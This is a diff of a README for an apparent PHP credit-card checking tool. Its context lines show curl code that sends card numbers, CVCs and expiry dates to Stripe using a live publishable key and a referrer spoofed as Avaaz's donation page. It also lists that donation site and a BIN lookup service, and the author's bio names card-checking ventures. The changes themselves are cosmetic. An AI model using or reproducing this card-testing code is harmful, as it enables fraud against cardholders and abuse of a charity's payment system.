@@ -35,7 +35,7 @@ curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$nombre.'+'.$apellido.'&card[address_line1]=&card[address_city]=&card[address_zip]=10001&card[currency]=USD&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=2a88d519-e56f-467a-9c63-c361a277ff54&muid=3190efac-5abc-4dac-9a48-03367b5b0064&sid=300c2fa4-1b47-44d1-8dfa-e0eb6728f2c3&payment_user_agent=stripe.js%2Fb78d06c%3B+stripe-js-v3%2Fb78d06c&referrer=https%3A%2F%2Fsecure.avaaz.org%2Fdonate%2Fpub-iframe.php%2F%3Fcid%3D3116%26lang%3Des%26sourceUrl%3Dhttps%253A%252F%252Fsecure.avaaz.org%252Fes%252Fdonate%252F&key=pk_live_eT3tlxY6x7Nzg9eDNkMYz99F&pasted_fields=number');
 ```
-###  SITES
+###  SITES 🌐
 
 - **Site Donation 1**
     - https://secure.avaaz.org/
@@ -47,13 +47,16 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$nombre.'+'.$apellido.'&card[
     - https://lookup.binlist.net/
 
 
-### Files included
+### Files included 📂
 
 - api.php
 
-### About Me
-- Founder of Unc3ns0r3d - HasBins - CloudChckr (Closed)
 
--My favorite programming languages are C ++, VB.NET, PYTHON, PHP, JAVASCIPRT and JQUERY
+### About Me 👨‍💻
+
+Founder of Unc3ns0r3d💳 - HasBins💳 - CloudChckr💳 (Closed)
+My favorite programming languages are C ++, VB.NET, PYTHON, PHP, JAVASCIPRT and JQUERY❤
+I love coffee❤
+The Unc3ns0r3d project was created 04/26/2018
 
 
